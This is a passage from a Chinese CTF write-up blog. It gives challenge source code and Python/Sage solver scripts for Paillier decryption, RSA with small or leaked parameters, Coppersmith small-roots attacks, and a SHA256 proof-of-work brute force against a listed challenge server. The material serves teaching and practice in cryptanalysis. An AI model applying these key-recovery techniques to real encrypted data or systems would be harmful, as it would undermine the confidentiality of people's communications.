class="line">lcm=<span class="number">29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540</span></span><br><span class="line">n=<span class="number">2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607</span></span><br><span class="line">c=<span class="number">2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,lcm)  <span class="comment"># 事实上，lcm乘多少都可以</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="同态加密"><a href="#同态加密" class="headerlink" title="同态加密"></a>同态加密</h3><ul><li><a href="https://jayxv.github.io/2020/05/14/密码学学习笔记之paillier%20cryptosystem/">参考</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> vanish <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getprime(<span class="number">512</span>)  <span class="comment"># 酱紫写？？</span></span><br><span class="line">q=nextprime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line">g=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(<span class="built_in">pow</span>(g,m,n*n)*<span class="built_in">pow</span>(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c=%d&quot;</span>%(c)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n=%d&quot;</span>%(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;g=%d&quot;</span>%(g)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275</span></span><br><span class="line"><span class="string">n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083</span></span><br><span class="line"><span class="string">g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$c = （g^m \mod n^2）*（r^n \mod n^2）\mod n^2 = g^m * r^n \mod n^2$</p><p>给c、n、g</p><blockquote><p>Paillier密码，于1999年由Pascal Paillier发明，是一种用于公钥加密的概率非对称算法。该算法具有加法同态的性质 ; 这意味着，仅给出公钥和m1、m2加密，可以计算出m1 + m2</p></blockquote><h5 id="模式1"><a href="#模式1" class="headerlink" title="模式1"></a>模式1</h5><ol><li>大素数p、q满足$gcd(pq, (p-1)*(q-1)) = 1$</li><li>$n=p\cdot q，λ = lcm(p-1, q-1) = \frac{(p-1)\cdot (q-1) }{ gcd(p-1,q-1)}$</li><li>选g,  $0&lt;g&lt;n^2$</li><li>$L(x) = \frac{x-1}{n}$</li><li>$μ = (L(g^λ \pmod {n^2} ))^{-1} \pmod n$</li><li>公钥：（n, g）</li><li>私钥：（λ，μ）</li></ol><h5 id="模式2"><a href="#模式2" class="headerlink" title="模式2"></a>模式2</h5><p>在模式1的基础上，改写g，λ，μ</p><ol><li>$g=n+1$</li><li>$λ = φ(n) = (p-1)\cdot (q-1)$</li><li>$μ = φ(n)^{-1} \pmod n$</li></ol><h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><ol><li><p>明文m需要满足$0≤m＜n$</p></li><li><p>选择随机 r，且满足$gcd(r,n)=1$</p></li><li><p>密文：$c=g^m⋅r^n(\mod n^2)$</p></li></ol><h5 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h5><p>$m = ( L( c^λ \pmod {n^2} ) \cdot μ ) \pmod n$</p><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><p>分解n,得到p、q </p><p>然后跟着解密步骤解就完事了</p><p>🤔但p的bit数好像根题目不符</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="constructor">L(<span class="params">x</span>)</span>:</span><br><span class="line">    return (x - <span class="number">1</span>) <span class="comment">// n</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275</span></span><br><span class="line">n = <span class="number">5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083</span></span><br><span class="line">g = <span class="number">786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108</span></span><br><span class="line"># print(factor(n))</span><br><span class="line">p = <span class="number">521</span></span><br><span class="line">q = <span class="number">10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123</span></span><br><span class="line">la = ((p - <span class="number">1</span>)<span class="operator"> * </span>(q - <span class="number">1</span>)) <span class="comment">// int(gmpy2.gcd(p - 1, q - 1))</span></span><br><span class="line">tmp = <span class="constructor">L(<span class="params">int</span>(<span class="params">pow</span>(<span class="params">g</span>, <span class="params">la</span>, <span class="params">n</span> <span class="operator">**</span> 2)</span>))</span><br><span class="line">miu = <span class="built_in">int</span>(gmpy2.invert(tmp, n))</span><br><span class="line">m = (<span class="constructor">L(<span class="params">int</span>(<span class="params">pow</span>(<span class="params">c</span>, <span class="params">la</span>, <span class="params">n</span> <span class="operator">**</span> 2)</span>)<span class="operator"> * </span>miu)) % n</span><br><span class="line">print(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>同态加密基于rsa的<strong>大素数分解难题</strong>，能得到p、q又有公钥就可解</p><h2 id="HZNUCTF校赛·math1"><a href="#HZNUCTF校赛·math1" class="headerlink" title="HZNUCTF校赛·math1"></a>HZNUCTF校赛·math1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = n - p - q + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = p * getPrime(<span class="number">135</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, phi * getPrime(<span class="number">69</span>) + <span class="number">1</span>, n)</span><br><span class="line">flag = <span class="string">b&quot;HZNUCTF&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(m).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p ^ q ^ x = <span class="subst">&#123;p ^ q ^ getPrime(<span class="number">100</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># n = 27963651181285314865245223420841376949170358907033350824157378307987529217967991046373794961962733982506983121192630829109141085046224889488610665139200726263728575086325474153370048617139175155262273813416260466529090140061623799460692881049637337480902401228983124051195350877685069281198499676151295387541487095621386248400085706944431571931100086046020193927566333993198580530464009149542183771408158783932309677038461604312997489255869750091721432213923367520176509845949128808520689563162109940702067960753814992404492253609346481785015501090495665364667572730774672925265663102438782954524410643148314614834421</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># c = 4112542234772265176907045140450105601374470669674397930575891050044126457030160166683760719042621526735064403906550294282692637793834725289405872203962576032128609572771779107747278189191796105964591794849874405525188273203917555992638684936192155868595119909648305108899175081741865334855359578531440348739274118813283368968474494522365300464616479</span></span><br><span class="line"><span class="comment"># p ^ q ^ x = 20322403539370874641338228395838205584791500136939852001791339832796937713367291083719519539069010591274070142977525555745107989472468046373764089233806857920378983806258439075231320039084798858470920027262481032484629504006942867681413153495094107614132308526877912014998940951049975837247629492037044418733</span></span><br></pre></td></tr></table></figure><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><p>将<code>phi * getPrime(69) + 1</code>当作e，由逆元定义，易得：d=1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,<span class="number">1</span>, n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = <span class="string">b&quot;HZNUCTF&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(m).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;HZNUCTF&#123;a664dad27b1a4bf0dd56f71bba4a8b1d&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Cop-Run"><a href="#Cop-Run" class="headerlink" title="Cop! Run!!"></a>Cop! Run!!</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">p = getPrime(n)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">P.&lt;t&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = t * t + randrange(p)</span><br><span class="line">print(f)</span><br><span class="line"></span><br><span class="line">x = [randrange(p)]</span><br><span class="line">x += [f(x[<span class="number">0</span>])]</span><br><span class="line">print([x_ &gt;&gt; (n - ceil(<span class="number">5</span> * n / <span class="number">7</span>)) for x_ in x])</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">y = f(x[-<span class="number">1</span>])</span><br><span class="line">for i in range(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    flag ^^= int(y)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="number">92946459607669</span><span class="number">93751377410225</span><span class="number">00572952497185</span><span class="number">93723232674702</span><span class="number">21285428735887</span><span class="number">313578</span>3</span><br><span class="line">t^2 + <span class="number">43844336985235</span><span class="number">86373441963163</span><span class="number">04259153882987</span><span class="number">91521868754583</span><span class="number">03290471864433</span><span class="number">311559</span>0</span><br><span class="line">[<span class="number">32486428330566</span><span class="number">35029095920782</span><span class="number">09562633794911</span><span class="number">359211649526</span>6, <span class="number">48839352219196</span><span class="number">23989344404485</span><span class="number">02547934602810</span><span class="number">168278179039</span>2]</span><br><span class="line"><span class="number">19320752909712</span><span class="number">57937786625190</span><span class="number">51231322609402</span><span class="number">86615581991593</span><span class="number">35983673951023</span><span class="number">13904490702547</span>833</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h3><ul><li>二元Coppersmith乱杀</li></ul><p>（根据题目构造好函数求低位就可以利用二元Coppersmith求得x列表</p><ul><li>flag解密过程与加密过程一致</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SageMath</span></span><br><span class="line"><span class="attribute">load</span>(&#x27;coppersmith.sage&#x27;)</span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"><span class="attribute">n</span> = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line"><span class="attribute">bits</span> = n - ceil(<span class="number">5</span> * n / <span class="number">7</span>)</span><br><span class="line"><span class="attribute">p</span> = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line"><span class="attribute">P</span>.&lt;x<span class="number">0</span>_<span class="number">0</span>, x<span class="number">1</span>_<span class="number">0</span>&gt; = PolynomialRing(Zmod(p))</span><br><span class="line"><span class="attribute">tmp</span> = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line"><span class="attribute">x0_1</span> = <span class="number">3248642833056635029095920782095626337949113592116495266</span> &lt;&lt; bits</span><br><span class="line"><span class="attribute">x1_1</span> = <span class="number">4883935221919623989344404485025479346028101682781790392</span> &lt;&lt; bits</span><br><span class="line"><span class="attribute">f</span> = (x<span class="number">0</span>_<span class="number">1</span>+x<span class="number">0</span>_<span class="number">0</span>)**<span class="number">2</span> + tmp - (x<span class="number">1</span>_<span class="number">1</span>+x<span class="number">1</span>_<span class="number">0</span>)</span><br><span class="line"><span class="attribute">x0_0</span>, x<span class="number">1</span>_<span class="number">0</span> = small_roots(f, (<span class="number">2</span>^bits, <span class="number">2</span>^bits), <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="attribute">x0</span> = x<span class="number">0</span>_<span class="number">1</span> + int(x<span class="number">0</span>_<span class="number">0</span>)</span><br><span class="line"><span class="attribute">x1</span> = x<span class="number">1</span>_<span class="number">1</span> + int(x<span class="number">1</span>_<span class="number">0</span>)</span><br><span class="line"><span class="attribute">x</span> =<span class="meta"> [x0, x1]</span></span><br><span class="line"><span class="attribute">flag</span> = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"><span class="attribute">P</span>.&lt;t&gt; = PolynomialRing(Zmod(p))</span><br><span class="line"><span class="attribute">f</span> = t * t + tmp</span><br><span class="line"><span class="attribute">y</span> = f(x[-<span class="number">1</span>])</span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="attribute">y</span> = f(y)</span><br><span class="line">    <span class="attribute">flag</span> ^^= int(y)</span><br><span class="line"><span class="attribute">print</span>(libnum.n<span class="number">2</span>s(int(flag)))</span><br></pre></td></tr></table></figure><h2 id="NSSCTF·-强网杯-2019-copperstudy"><a href="#NSSCTF·-强网杯-2019-copperstudy" class="headerlink" title="NSSCTF·[强网杯 2019]copperstudy"></a>NSSCTF·[强网杯 2019]copperstudy</h2><p>模版套娃题</p><p>（NSSCTF复现的有些问题，可能存在代码对了没结果的情况，做的颇为费时</p><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><p>只给了靶机地址与端口, 连接后开始挑战</p><h3 id="题解-12"><a href="#题解-12" class="headerlink" title="题解"></a>题解</h3><ul><li><p>sha256爆破</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) wenhui@<span class="symbol">Harrys</span>-<span class="symbol">MacBook</span>-<span class="symbol">Pro</span> ~ <span class="comment">% nc 1.14.71.254 28406</span></span><br><span class="line">[+]proof: skr=os.urandom(<span class="number">8</span>)</span><br><span class="line">[+]hashlib.sha256(skr).hexdigest()=<span class="number">67328</span>fdbc950d58d6194a09ca7ad2751d5cdef2e75d4bd57cd9f06d5813f0ad0</span><br><span class="line">[+]skr[<span class="number">0</span>:<span class="number">5</span>].encode(<span class="string">&#x27;hex&#x27;</span>)=e2130d4e25</span><br><span class="line">[-]skr.encode(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line">e2130d4e254fd917</span><br><span class="line">proof completed</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry</span>(<span class="params">data</span>):</span></span><br><span class="line">    s = hashlib.sha256()  <span class="comment"># Get the hash algorithm.</span></span><br><span class="line">    s.update(data)  <span class="comment"># Hash the data.</span></span><br><span class="line">    b = s.hexdigest()  <span class="comment"># Get he hash value.</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = <span class="string">&#x27;323b72a6cd69d0b7780ec5a7f5ca467888cab27ddd2e4aa4e60b73a94e12c77d&#x27;</span></span><br><span class="line">hex5 = <span class="string">&#x27;190a2e347c&#x27;</span></span><br><span class="line">hex5 = hex5.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">skr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">3</span>):</span><br><span class="line">    i = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    skr = hex5 + i</span><br><span class="line">    <span class="built_in">print</span>(skr)</span><br><span class="line">    skr_ = decry(skr)</span><br><span class="line">    <span class="keyword">if</span> skr_ == sha:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(skr.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>已知m高位</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[+]</span>Generating challenge <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>n=<span class="number">24356325449465878008573189069822683605566325207916003425572312871257434066735339351419022606651978564409319854124040390674260674732564840194350117020415343008229943042334102640238880933567550793561550749967150961083366558936482352374990331852259346471621770085261320898538402590645945335446391581595043991636430048371479572927936823346342473370679940627084184474965268493672815645510317544641300573456793341459261030239478468256474697145442446703874239050652733363969490084736015234648029721030296379935311207385820508381103059781709196062980850466538106046617857536788261456423074851392626599614225296568220684082233</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>m=random<span class="selector-class">.getrandbits</span>(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>c=pow(m,e,n)=<span class="number">279116358436840581010075391425636114595316473734626962378925974945912936713312369021195130534903624351919224866669072204225138654025018245713127331395303380222577110932576056933575781802632335925559470076545360667419161465650880040669969136201922200324547177017394013299202303169894435173</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>((m&gt;&gt;<span class="number">72</span>)&lt;&lt;<span class="number">72</span>)=<span class="number">653524334392227601010919065348707977696937791058152587391549467964777834749978354872413711237120</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[-]</span>long_to_bytes(m)<span class="selector-class">.encode</span>(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>e53534354467b39323534303365663262613837316331313365623038353131363636356631347d</span><br><span class="line">challenge1 completed</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">17641791540530228694286135185364074270246417140538172343866345466143247980659455424376045685494166279876110132203178803899115680922576583783724143783790241934890713111735488241729348106606502962464794620278410346388397359673075821123140990941942289674002895075430115017639376231448894324816030053817634283366169122125231411123494823295007054961127500058834017497105743260495984200175488365511990260484741462938371341033116032935020587367904271953619183649263518669540687237751562870973258276042987062056763970912250995314217713966476714492906919554248815811082015216774212685970371820986012163337575801128737022100901</span></span><br><span class="line">mbar = <span class="number">653524334392227600317610369760395325667407883325756386751869881379847068844170310055337360621568</span></span><br><span class="line">c = <span class="number">279116358436840580121751323591931874995783037840229208462822785113356478604601761572940996937612929433055849494515561733423792677427130977192018567922037737644911574834397373382160864107212935056196095912820832399095116695115669158974901004546975979648317608777413620402597811562020634469</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">kbits = <span class="number">72</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(mbar) + <span class="built_in">int</span>(x0)).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><ul><li><p>已知p高位</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[+]</span>Generating challenge <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>n=<span class="number">23411615301291435655477801748625769339716407033511189983098780086891046009303028158463324140747944603588215418067393823094137876411379397381410031095697696292166476032512871410272768379677559567972276031538034846795245203959238906540111544506685078584531349272589770893813281618844530003255759935566936903284897174521506447857387462971045194978917820434934738691829707246515997926007217221181797932139498440604926293194444820566068160382363378745057906848008922430323300850797214158795943526446652900363836595788985435156443232660016272234951129406706808949692152532652106869678988356843173692120312556632060687880277</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>m=random<span class="selector-class">.getrandbits</span>(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>c=pow(m,e,n)=<span class="number">20816687484629729248358599515200912090054626605187551167120440993080422432047195669753081296607778685789965152636292757077874182391701553297762409167922636195265302544331699555007035722696233758502329524496584833047661025920311619881120186355000799849110094937608332808435206343994582498338158558465886308617345046792992841949660056279285857662920319320845051388660815881694032340263668979130325615050235744767268030400030419743994149379045928464190406672664167865665901137911387554138311249666942277285098274888564033164491871776333496136941304304822482118466906618116810675882818933948662360186284886643033894106033</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>((p&gt;&gt;<span class="number">128</span>)&lt;&lt;<span class="number">128</span>)=<span class="number">168129018477669834191979662452833171533865381169326621445539439928300089595715365788571138946327251430738085293790548033554213639388233113347470851361022852297671479442101374855849510028550686558156349265097691151737089307186764069936608051965694418753664327625349371264720709116711249000736290817929925099520</span></span><br><span 